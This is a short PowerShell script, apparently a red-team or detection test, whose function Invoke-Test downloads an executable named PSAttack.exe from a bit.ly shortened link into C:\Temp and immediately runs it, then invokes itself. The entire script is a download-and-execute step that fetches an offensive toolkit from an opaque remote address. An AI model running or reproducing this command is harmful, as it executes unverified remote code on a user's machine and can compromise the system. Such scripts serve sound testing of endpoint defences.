function Invoke-Test {
    $src = 'https://bit.ly/2FeUnJ6'
    $dist = 'C:\Temp\PSAttack.exe'
    Invoke-WebRequest -Uri $src -OutFile $dist
    & 'C:\Temp\PSAttack.exe'
}

Invoke-Test